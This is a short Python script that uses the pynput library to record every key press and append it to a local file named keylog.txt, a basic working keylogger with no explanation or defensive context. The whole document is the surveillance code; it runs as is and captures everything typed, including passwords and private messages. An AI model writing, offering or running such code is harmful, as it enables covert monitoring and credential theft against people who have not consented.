from pynput.keyboard import Listener

def write_to_file(key):
    try:
        key_data = str(key.char)
    except AttributeError:
        key_data = str(key)

    with open("keylog.txt", "a") as f:
        f.write(key_data + "\n")

with Listener(on_press=write_to_file) as listener:
    listener.join()
